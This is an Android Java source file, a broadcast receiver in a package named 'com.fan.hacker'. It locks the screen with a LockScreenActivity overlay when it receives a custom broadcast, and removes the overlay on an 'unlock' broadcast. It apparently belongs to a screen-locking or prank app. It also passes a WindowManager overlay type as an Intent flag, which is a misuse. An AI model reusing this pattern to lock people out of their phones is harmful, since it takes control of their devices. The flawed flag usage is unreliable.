package com.fan.hacker;
//


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.view.WindowManager;

public class UtilReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		if(intent.getAction().equals("com.fan.hacker.lockscreen"))
		{
            Intent localIntent = new Intent(context, LockScreenActivity.class);
            localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            localIntent.addFlags(WindowManager.LayoutParams.TYPE_SYSTEM_ERROR);
            context.startActivity(localIntent);
            System.out.println("screen been locked!");
            
        }
		else if (intent.getAction().equals("com.fan.hacker.unlockscreen")) {
			LockScreenActivity.winManager.removeView(LockScreenActivity.wrapperView);
			LockScreenActivity.wrapperView.removeAllViews();
			System.out.println("screen been un locked!");
		}

	}

}
